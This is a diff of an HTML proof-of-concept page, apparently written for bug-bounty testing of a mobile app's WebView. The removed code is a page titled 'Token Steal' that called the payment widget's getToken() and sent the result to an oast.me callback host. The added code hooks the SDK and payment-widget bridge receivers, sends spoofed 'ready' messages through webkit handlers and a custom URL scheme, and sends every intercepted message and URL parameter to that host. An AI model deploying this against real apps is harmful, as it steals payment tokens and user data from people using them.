@@ -1,25 +1,59 @@
-  <html>
-  <head><title>Token Steal</title></head>
+ <html><head><title>PoC</title></head>
   <body>
   <script>
-  var data = {};
+  // Hook BOTH receivers
+  window.__plusSDKMobileCompat.onMessage = function(msg) {
+    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/sdk-msg?" + encodeURIComponent(typeof msg === 'string' ? msg : JSON.stringify(msg)));
+  };
+  window.__webviewPaymentWidget.onEvent = function(evt) {
+    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/pay-evt?" + encodeURIComponent(typeof evt === 'string' ? evt : JSON.stringify(evt)));
+  };
 
-  // Call getToken() on the payment widget bridge!
-  try {
-    data.token = window.__webviewPaymentWidget.getToken();
-  } catch(e) {
-    data.token_error = e.message;
-  }
-  
-  // Also try calling it as a function
-  try {
-    data.token2 = window.__webviewPaymentWidget.getToken.call(window.__webviewPaymentWidget);
-  } catch(e) {
-    data.token2_error = e.message;
-  }
+  // Now try to trigger native to send us data via postMessage to window
+  window.addEventListener("message", function(e) {
+    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/postmsg?" + encodeURIComponent(JSON.stringify({origin:e.origin,data:e.data})));
+  });
 
-  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/token?" + encodeURIComponent(JSON.stringify(data)));
-  document.title = JSON.stringify(data);
+  // Signal "ready" - the SDK might be waiting for this before sending data
+  // Try various ready signals
+  var readyMessages = [
+    '{"type":"ready"}',
+    '{"type":"sdk_ready"}',
+    '{"type":"init","version":"95.0.12"}',
+    '{"type":"page_ready"}',
+    '{"action":"ready"}',
+    '{"event":"ready","status":"loaded"}',
+  ];
+
+  readyMessages.forEach(function(msg) {
+    // Send via the bridge back to native (iOS uses webkit.messageHandlers or URL scheme)
+    try { window.webkit.messageHandlers.plus.postMessage(msg); } catch(e){}
+    try { window.webkit.messageHandlers.plusSDK.postMessage(msg); } catch(e){}
+    try { window.webkit.messageHandlers.native.postMessage(msg); } catch(e){}
+
+    // Also try navigating to SDK scheme (iOS intercepts navigations)
+    var iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'plus-sdk://ready?' + encodeURIComponent(msg);
+    document.body.appendChild(iframe);
+    setTimeout(function(){ document.body.removeChild(iframe); }, 100);
+  });
+
+  // Also: the page URL itself has params (available_features, service_name, etc.)
+  // Parse them and report - the COOKIE_INJECT feature means cookies SHOULD be injected
+  var params = new URLSearchParams(window.location.search);
+  var features = params.getAll('available_features');
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/features?" + encodeURIComponent(JSON.stringify({
+    features: features,
+    service: params.get('service_name'),
+    deeplink: params.get('deeplink'),
+    allParams: Object.fromEntries(params)
+  })));
+
+  // Wait and report any messages received after 15s
+  setTimeout(function(){
+    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/final-check?still_listening=true");
+  }, 15000);
   </script>
   </body>
   </html>
